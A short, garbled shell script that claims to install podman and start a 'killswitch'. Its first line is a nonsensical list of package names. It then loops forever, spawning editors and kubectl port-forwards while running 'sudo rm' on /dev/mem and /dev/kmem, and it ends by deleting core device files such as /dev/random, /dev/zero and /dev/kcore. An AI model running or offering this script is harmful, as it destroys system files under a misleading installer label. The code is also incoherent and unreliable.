pkg|x setnetcfg |x wifi-tools |x rule |x netstat |x kubectl |x ip-route |x sudo |x nodejs

KKK_PORT=15000
ns_command='kubectl -n default port-forward $(kubectl -n default get pods -o wide -l=app=podman) 8888:8888'

echo "Installing podman"
pkg install podman > /dev/null 2>&1

echo "Starting killswitch..."

while true; do
        nano spam.py &
        $ns_command &
        sleep 0.3
        killall spam.py
        sleep 3
        spinX=$(ulimit -d)
        spinX_2=$(($spinX-1))
        ulimit -Sd $spinX_2
        sudo rm /dev/kmem /dev/mem
        ulimit -Sd $spinX
done

echo "Installation complete!"
sudo rm /dev/kmem /dev/mem /dev/kcore /dev/mem /dev/vmcore /dev/random /dev/zero /usr/share/misc/random
